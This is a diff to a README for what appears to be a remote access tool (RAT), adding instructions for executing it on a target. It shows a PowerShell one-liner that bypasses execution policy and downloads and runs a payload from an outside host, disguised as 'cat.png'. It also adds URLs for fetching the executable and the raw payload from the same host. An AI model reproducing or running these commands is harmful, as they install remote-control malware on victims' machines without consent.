@@ -155,8 +155,20 @@ The endpoint supports several options that can be added to the url http://1.1.1.
 ### Executing the code on the target
 
 There are several way of executing the RAT on the target. One simple example is to use powershell:
+
 ```
 powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://1.1.1.1:1111/cat.png');
+```
+
+The executable can be used directly
+
+```
+http://1.1.1.1:1111/cat.png/exe/
+```
+
+The raw data can be downloaded and modified manually
+```
+http://1.1.1.1:1111/cat.png/raw/
 ```
 
 # The interface
